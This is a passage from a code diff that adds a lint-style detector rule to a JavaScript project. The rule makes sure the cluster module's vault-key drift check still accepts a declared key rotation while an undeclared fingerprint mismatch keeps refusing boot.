+    // intentionally removed, carry an
+    // `allow:cluster-vault-key-drift-without-rotation-accept-gate` marker
+    // with the reason.
+    id: "cluster-vault-key-drift-without-rotation-accept-gate",
+    primitive: "lib/cluster.js _checkVaultKeyConsistency MUST gate the VAULT_KEY_DRIFT FATAL refusal on the operator's rotation declaration (configuredAcceptRotation, set from init opts.acceptVaultKeyRotation). A vault-key rotation legitimately changes the public-key fingerprint on every node; without the gate, every node refuses boot after a rotation. The undeclared-mismatch path stays fail-closed; the declared path adopts the new fingerprint and bumps rotationEpoch. Removing the gate re-opens the post-rotation cluster-wide boot outage.",
+    regex: /throw\s+_err\(\s*["']VAULT_KEY_DRIFT["']/,
+    requires: /configuredAcceptRotation|allow:cluster-vault-key-drift-without-rotation-accept-gate/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "ROTATION-EPOCH ACCEPT in lib/cluster.js: b.vault.rotate re-keys the local dataDir and changes the SHA3-512 vault-public-key fingerprint, but only the local dataDir — the external _blamejs_cluster_state coordination row keeps the old fingerprint, so every node would VAULT_KEY_DRIFT-refuse boot (a cluster-wide outage after a routine key rotation). The mismatch refusal is now gated on configuredAcceptRotation: declared rotation adopts the new fingerprint + bumps rotationEpoch; undeclared mismatch still fails closed (CWE-345 binding-integrity for sealed columns). Detector locks the gate so a future re-hardening of the drift path can't drop the rotation escape hatch. VAULT_KEY_DRIFT is unique to cluster.js; allowlist empty.",
   },
 
   // Codex P1 on v0.12.11 PR #162 — surfaced the NaN/Infinity bypass
